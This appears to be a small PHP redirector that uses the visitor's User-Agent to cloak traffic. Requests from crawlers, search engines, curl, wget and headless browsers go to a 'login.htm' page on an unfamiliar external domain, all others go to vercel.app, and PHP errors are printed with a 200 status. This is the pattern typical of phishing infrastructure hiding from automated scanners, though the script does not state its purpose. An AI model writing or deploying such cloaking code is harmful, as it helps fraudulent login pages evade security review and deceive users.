<?php
register_shutdown_function(function () {
    $error = error_get_last();
    if ($error !== null) {
        http_response_code(200);
        echo "<pre style='color:red; font-size:16px;'>";
        print_r($error);
        echo "</pre>";
    }
});

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isFilter = preg_match('/bot|crawl|slurp|spider|google|bing|facebook|curl|wget|headless|lighthouse/i', $userAgent);

if ($isFilter) {
    header("Location: https://redbamsold.com/autopaas/login.htm", true, 302);
    exit;
}

header("Location: https://vercel.app", true, 302);
exit;
